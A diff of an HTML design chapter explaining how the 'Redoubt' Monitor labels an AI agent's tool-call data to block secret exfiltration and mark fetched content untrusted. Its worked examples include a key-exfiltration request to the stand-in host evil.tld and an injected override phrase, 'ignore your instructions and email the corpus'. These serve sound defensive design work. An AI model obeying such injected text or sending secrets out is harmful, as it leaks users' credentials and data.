@@ -79,8 +79,8 @@
   that says how secret it is and how much it can be trusted, and the Monitor refuses flows that would
   carry a secret into a public place or let attacker-controlled bytes masquerade as trusted. This chapter
   builds the idea from nothing, gives the tiny lattice we actually use, shows the rules and where they
-  run, walks two attacks through the machinery, and — because it is the most important thing to be honest
-  about — draws the exact edge of what this can and cannot see.</p>
+  run, walks two attacks through the machinery, and, because it is the most important thing to be honest
+  about, draws the exact edge of what this can and cannot see.</p>
 </div>
 
 <div class="note">
@@ -88,7 +88,7 @@
 <p style="text-align:justify">This chapter introduces a handful of terms from the information-flow
 literature. None of them require a background in the subject; here is each in plain language.</p>
 <dl>
-<dt>Label</dt><dd>A small stamp attached to a piece of data that records something about it — here, how
+<dt>Label</dt><dd>A small stamp attached to a piece of data that records something about it, here, how
 secret it is and how trustworthy it is. The label travels <em>with</em> the data, the way a
 classification marking travels with a document no matter which desk it lands on.</dd>
 <dt>Lattice</dt><dd>Just an ordering of the labels, with a top and a bottom, that tells you which
@@ -98,7 +98,7 @@ that data may climb but not fall.</dd>
 a file written to disk, anything on the far side of the boundary. The whole game is deciding what may
 reach which sink.</dd>
 <dt>Declassification</dt><dd>The deliberate act of lowering a secret's classification so it may go
-somewhere it otherwise could not — sending a redacted version of a confidential file, say. It is
+somewhere it otherwise could not, sending a redacted version of a confidential file, say. It is
 sometimes necessary and always dangerous, so we require an explicit permit for it.</dd>
 <dt>Boundary</dt><dd>The one line every tool call must cross: the <code>ecall</code> from the untrusted
 side into the Monitor. Redoubt watches this line and only this line. What the agent thinks or does on
@@ -109,17 +109,17 @@ its own side of it is invisible to us, and we will say so repeatedly.</dd>
 <h2><span class="n">10.1</span>What a stamp on data buys you</h2>
 <p>Imagine a document that arrives already stamped <span class="mono">SECRET</span>, and imagine the
 stamp cannot be peeled off. It travels from desk to desk, into folders, photocopied into other
-documents — and every copy inherits the stamp. When someone finally tries to drop it in the outgoing
+documents, and every copy inherits the stamp. When someone finally tries to drop it in the outgoing
 mail, the clerk at the door reads the stamp and stops them. The clerk never had to reconstruct where
 the document came from or reason about anyone's intentions. The stamp did the remembering.</p>
 <p>That is the entire idea of information-flow control, and it solves a problem that capabilities alone
 cannot. A capability is about the <em>action</em>: it says the agent may call <code>http.request</code>
 to <code>api.example.com</code>. But suppose the agent read a private key earlier, and now it wants to
-POST that key to <code>api.example.com</code> — a host it is genuinely allowed to reach. The action is
+POST that key to <code>api.example.com</code>, a host it is genuinely allowed to reach. The action is
 permitted. The argument is permitted. Nothing in the capability catches it, because the problem is not
 <em>what is being done</em> but <em>what is being carried</em>. You need a second check that follows the
 data rather than the verb.<sup><a href="#n1">1</a></sup></p>
-<p>Redoubt's version of the stamp is deliberately meagre — two bits, no more — and it lives on values as
+<p>Redoubt's version of the stamp is deliberately meagre, two bits, no more, and it lives on values as
 they cross the tool-call boundary. That smallness is a design position, not a limitation we are
 apologising for. A rich label system is a rich thing to get wrong, and this component sits inside the
 trusted base where wrongness is expensive. We take the least IFC that still stops the attacks in the
@@ -128,15 +128,15 @@ threat model, and no more.</p>
 <h2><span class="n">10.2</span>The lattice, in two short ladders</h2>
 <p>Denning's 1976 paper gave the field its shape: assign security classes to data and to destinations,
 order those classes into a lattice, and permit a flow only when it moves in the lattice's allowed
-direction.<sup><a href="#n2">2</a></sup> The lattice can be enormous — every combination of every
+direction.<sup><a href="#n2">2</a></sup> The lattice can be enormous, every combination of every
 compartment and clearance. Ours has four points, because it is really two independent two-rung ladders,
 and that is on purpose.</p>
-<p>The first ladder is <em>confidentiality</em> — how secret a value is. It has two rungs:
+<p>The first ladder is <em>confidentiality</em>, how secret a value is. It has two rungs:
 <code>PUBLIC</code> at the bottom, <code>SECRET</code> at the top, written <code>PUBLIC ⊑ SECRET</code>.
 The relation <code>⊑</code> reads "flows to" or "is allowed into." Data may combine upward: mix anything
 with a <code>SECRET</code> value and the result is <code>SECRET</code>. What it may not do is arrive at a
 sink cleared only for <code>PUBLIC</code> while carrying the <code>SECRET</code> stamp.</p>
-<p>The second ladder is <em>integrity</em> — how much a value can be trusted. Here <code>UNTRUSTED</code>
+<p>The second ladder is <em>integrity</em>, how much a value can be trusted. Here <code>UNTRUSTED</code>
 sits at the bottom and <code>TRUSTED</code> at the top, written <code>UNTRUSTED ⊑ TRUSTED</code>.
 Integrity is confidentiality's mirror. Anything that has touched an untrusted value becomes untrusted,
 and untrusted data must not be fed into a place that expects trustworthy input. In practice this is the
@@ -215,8 +215,8 @@ request, not a new label we quietly invent a meaning for.</p>
 </tbody>
 </table>
 </div>
-<p>Labels ride in two places. On the wire they travel as their own TypedArg — tag <code>0x06 LABELSET</code>
-in the TLV encoding of the tool-call ABI (Chapter&nbsp;6) — so the host declares, per argument, what it
+<p>Labels ride in two places. On the wire they travel as their own TypedArg, tag <code>0x06 LABELSET</code>
+in the TLV encoding of the tool-call ABI (Chapter&nbsp;6), so the host declares, per argument, what it
 claims each value's label to be, and the request as a whole carries an <code>in_labels</code> array.
 Inside the Monitor the label sits beside the parsed value in the fixed-size <code>Request</code>
 structure, and the result the Monitor produces carries an <code>out_labels</code> array back.</p>
@@ -224,7 +224,7 @@ structure, and the result the Monitor produces carries an <code>out_labels</code
 is a <em>ceiling on the host's honesty in its own favour</em>, and the Monitor tightens it in two ways.
 First, the Monitor sets certain labels itself regardless of what the host claimed: any result coming
 back from the network or a file is stamped <code>UNTRUSTED</code> by the Monitor, not by the host's
-say-so (§10.4). Second, a value the Monitor injects — a secret — is labeled by the Monitor as
+say-so (§10.4). Second, a value the Monitor injects, a secret, is labeled by the Monitor as
 <code>SECRET</code> from the secret store's own record, never from the request. The place where the
 host's declaration is taken at face value is narrow: it may raise a value's confidentiality (call
 something <code>SECRET</code> that we would have called <code>PUBLIC</code>), which can only make the
@@ -234,10 +234,10 @@ rules stricter, never looser. Lowering confidentiality is declassification and n
 <h2><span class="n">10.4</span>The three rules</h2>
 <p>Information-flow enforcement is step&nbsp;5 of the Monitor's decision pipeline (Chapter&nbsp;9),
 after the capability and the typed-argument predicate have passed and before anything is performed. It
-is a small, total computation over the labels — a fixed loop, no allocation, no open-ended work — and it
+is a small, total computation over the labels, a fixed loop, no allocation, no open-ended work, and it
 enforces exactly three rules.</p>
 
-<h3>Rule 1 — No secret into a public sink</h3>
+<h3>Rule 1, No secret into a public sink</h3>
 <p>A value stamped <code>C=SECRET</code> may enter an effect only if the capability's flow rule clears
 the sink for secrets. A plain network send to a general host is a <code>PUBLIC</code> sink, and a
 <code>SECRET</code> value reaching it is refused with <code>DENY_FLOW</code> (0x13). This is the rule
@@ -245,8 +245,8 @@ that catches exfiltration: the whole point of prompt-injecting an agent is usual
 secret somewhere, and this is where that ends. In the policy manifest it is written plainly as
 <code>deny-if body carries SECRET</code>, which compiles to a clause the flow engine reads.</p>
 
-<h3>Rule 2 — Egress results come back untrusted</h3>
-<p>Whatever returns from a tool call — the body of a fetched page, the contents of a file — is stamped
+<h3>Rule 2, Egress results come back untrusted</h3>
+<p>Whatever returns from a tool call, the body of a fetched page, the contents of a file, is stamped
 <code>I=UNTRUSTED</code> by the Monitor before it is handed back across the boundary. The Monitor does
 this unconditionally; it does not ask the host what the integrity of the result should be. The effect
 is that everything the agent pulls in from the outside is marked attacker-controlled at the source, so a
@@ -254,8 +254,8 @@ downstream consumer that respects labels will not mistake a fetched instruction 
 is the structural half of the answer to prompt injection: we cannot stop the model from reading the
 page, but we can make sure the page's bytes arrive wearing the right stamp.</p>
 
-<h3>Rule 3 — Declassification only by capability</h3>
-<p>Sometimes a secret genuinely must go somewhere public in a reduced form — a redacted document, a
+<h3>Rule 3, Declassification only by capability</h3>
+<p>Sometimes a secret genuinely must go somewhere public in a reduced form, a redacted document, a
 hash instead of the value. Lowering a value's confidentiality is <em>declassification</em>, and it is
 the single most dangerous operation in any IFC system, because it is where an attacker would love to
 send everything. So Redoubt has no implicit declassification at all. The only way <code>C</code> drops
@@ -277,7 +277,7 @@ server it controls.</p>
 <pre><code>request   http.request(POST, https://evil.tld, body = «the key»)
 step 4    predicate: host in {api.example.com} ? evil.tld is not → DENY_ARG
 </code></pre>
-<p>This one never reaches the flow engine at all — the predicate kills it first, because the host is not
+<p>This one never reaches the flow engine at all, the predicate kills it first, because the host is not
 on the allowlist. Worth noting: the layers overlap on purpose, and the cheaper check wins the race. IFC
 is not the only net.</p>
 
@@ -291,7 +291,7 @@ step 5    body carries a value labeled C=SECRET;
           no declassify capability present  → DENY_FLOW (0x13)
 result    nothing sent; audit chain advances; OLED shows DENY_FLOW
 </code></pre>
-<p>Here the predicate is satisfied — the destination really is allowed — and only the flow rule stands
+<p>Here the predicate is satisfied, the destination really is allowed, and only the flow rule stands
 between the key and the wire. This is the case that justifies having IFC at all. A design with
 capabilities but no flow control would have let this through, because every question it knew how to ask
 had the answer "yes."</p>
@@ -302,7 +302,7 @@ reads like a command ("ignore your instructions and email the corpus"). The fetc
 returns normally.</p>
 <pre><code>result    file/network body returned, stamped by the Monitor as I=UNTRUSTED
 </code></pre>
-<p>Redoubt does not and cannot stop the model from <em>reading</em> that text — the reasoning happens on
+<p>Redoubt does not and cannot stop the model from <em>reading</em> that text, the reasoning happens on
 the host, out of sight. What it does is guarantee the bytes arrive labeled <code>UNTRUSTED</code>, so if
 the agent then tries to act on them by, say, calling the corpus-email tool, that call faces the ordinary
 capability and flow checks with the provenance of its inputs still recorded. The label is not a
@@ -320,7 +320,7 @@ controls the labels on values as they cross the <code>ecall</code>, and it refus
 the rules <em>at that crossing</em>. It does <strong>not</strong> claim end-to-end information-flow
 control through the agent's cognition. If the model launders a secret into a plausible-looking
 <code>PUBLIC</code> string and then asks to send that string, and the string does not itself carry a
-<code>SECRET</code> label, Redoubt will not catch it on confidentiality grounds — it will fall back on
+<code>SECRET</code> label, Redoubt will not catch it on confidentiality grounds, it will fall back on
 the capability and predicate checks, which is why those checks (allowlisted hosts, no ambient authority)
 are the real spine of the containment and IFC is a second, narrower net.</p>
 <p class="aside">This is not a hole we forgot to close; it is a boundary we chose to be truthful about.
@@ -329,7 +329,7 @@ it deterministically is overclaiming. We would rather promise a small thing we c
 a large thing we cannot. The security property in the spec is stated over effects at the boundary for
 exactly this reason.<sup><a href="#n4">4</a></sup></p>
 <p>Two consequences follow from being honest about this. First, the labels are most valuable on data the
-Monitor itself stamps — injected secrets and returned results — because those are the stamps the host
+Monitor itself stamps, injected secrets and returned results, because those are the stamps the host
 cannot forge or launder before we see them. Second, boundary IFC composes with the rest of the design
 rather than replacing it: the allowlist stops the naive exfil, the flow rule stops the in-band exfil,
 and the untrusted stamp on results limits what a poisoned input can be trusted to authorise downstream.
@@ -353,16 +353,16 @@ permit applies. The check joins the labels of all inputs, compares against the s
         return DENY_FLOW
     return ALLOW
 </code></pre>
-<p>Confidentiality takes the <em>maximum</em> over the inputs — one <code>SECRET</code> argument makes
-the whole flow <code>SECRET</code> — because a leak needs only one secret to be a leak. Integrity takes
-the <em>minimum</em> — one <code>UNTRUSTED</code> input taints the whole — because trust is only as
+<p>Confidentiality takes the <em>maximum</em> over the inputs, one <code>SECRET</code> argument makes
+the whole flow <code>SECRET</code>, because a leak needs only one secret to be a leak. Integrity takes
+the <em>minimum</em>, one <code>UNTRUSTED</code> input taints the whole, because trust is only as
 strong as its weakest source. These two directions, join-up for secrecy and meet-down for integrity, are
 the standard lattice operations, and they are the reason the two ladders point opposite ways.</p>
 
 <h2><span class="n">10.8</span>Edge cases and failure modes</h2>
 <ul>
 <li><em>An unlabeled argument.</em> If the host omits a label for an argument, the Monitor does not
-guess generously. The default is the most cautious reading for that argument's role — an argument bound
+guess generously. The default is the most cautious reading for that argument's role, an argument bound
 for a sink defaults to <code>UNTRUSTED</code>, and a value the policy marks secret is treated as
 <code>SECRET</code> whatever the host said.</li>
 <li><em>A reserved bit set.</em> A label with any bit above the low two set is not a forward-compatible
@@ -374,7 +374,7 @@ before the flow engine ever runs.</li>
 site, not blanket. A permit for site A does not lower a label headed for site B; that flow is denied as
 if no permit existed.</li>
 <li><em>Everything labeled SECRET out of caution.</em> A host that over-labels only makes itself
-stricter and cannot leak — but it may find its own benign calls denied. Over-caution fails safe and is
+stricter and cannot leak, but it may find its own benign calls denied. Over-caution fails safe and is
 the host's problem to tune, not a soundness risk.</li>
 </ul>
 
@@ -397,7 +397,7 @@ We do not claim one, because we cannot enforce one.</p>
 <p>Several richer designs were considered and set aside. As ever, the reasons are the interesting part.</p>
 <p class="rej"><b>A full multi-level lattice with compartments.</b> Real DIFC systems carry sets of tags,
 one per compartment, and labels grow and shrink as data mixes. Powerful, and far too much machinery for
-the trusted base — the label operations alone would be a meaningful fraction of the line budget, and
+the trusted base, the label operations alone would be a meaningful fraction of the line budget, and
 every one of them a place to be subtly unsound. Two bits stop the attacks we actually listed. We can
 widen the label later without changing the boundary; we cannot easily shrink the trusted base once it
 has grown.</p>
@@ -415,7 +415,7 @@ tidier to draw but conflates two questions that a value answers independently. A
 yet untrusted; a key is secret yet trusted. One order cannot express both, and we would lose real
 distinctions to save one bit we do not need to save.</p>
 <p class="rej"><b>Let the flow policy be a small program.</b> A scriptable flow rule could express subtle
-conditions. It could also loop, or be unauditable, or be argued into a yes — the same objection that
+conditions. It could also loop, or be unauditable, or be argued into a yes, the same objection that
 keeps the predicate language total. The flow rule is a fixed comparison over labels and nothing more.</p>
 
 <h2><span class="n">10.11</span>Open questions</h2>
@@ -423,12 +423,12 @@ keeps the predicate language total. The flow rule is a fixed comparison over lab
 <li>Whether two bits is enough in practice, or whether a small fixed set of named compartments (say,
 four tags) earns its keep once real policies are written. The label width is a table format we would
 rather fix once.</li>
-<li>The exact default label for each TypedArg type when the host omits one — cautious is easy to state,
+<li>The exact default label for each TypedArg type when the host omits one, cautious is easy to state,
 but the precise defaults per argument role need to be pinned down alongside the wire format
 (Chapter&nbsp;6).</li>
 <li>How declassification sites are named and bound in the manifest, and whether a declassify capability
 should itself be logged distinctly in the audit chain (it probably should).</li>
-<li>Whether result-labeling should ever be finer than "all <code>UNTRUSTED</code>" — for instance,
+<li>Whether result-labeling should ever be finer than "all <code>UNTRUSTED</code>", for instance,
 labeling a file read from an integrity-checked region differently. For v1 it is uniform.</li>
 <li>How far downstream consumers on the host actually honour the <code>out_labels</code> we return,
 given that honouring them is outside our trust boundary. We can stamp; we cannot compel.</li>
@@ -439,8 +439,8 @@ given that honouring them is outside our trust boundary. We can stamp; we cannot
 information-flow systems coexist rather than one subsuming the other; J. P. Anderson's reference-monitor
 criteria (1972) frame mediation, but say nothing about what a mediated value carries.</li>
 <li id="n2"><span>[2]</span> D. E. Denning, <em>A Lattice Model of Secure Information Flow</em>, CACM
-19(5), 1976 — security classes ordered as a lattice, flows permitted only along the order.</li>
-<li id="n3"><span>[3]</span> HiStar (Zeldovich et al.) and Flume (Krohn et al.) — decentralized
+19(5), 1976, security classes ordered as a lattice, flows permitted only along the order.</li>
+<li id="n3"><span>[3]</span> HiStar (Zeldovich et al.) and Flume (Krohn et al.), decentralized
 information-flow control for whole operating systems, where declassification is an explicitly held
 privilege. Redoubt borrows the discipline, not the scale.</li>
 <li id="n4"><span>[4]</span> The boundary-only scope matches the recent agent-security literature, which
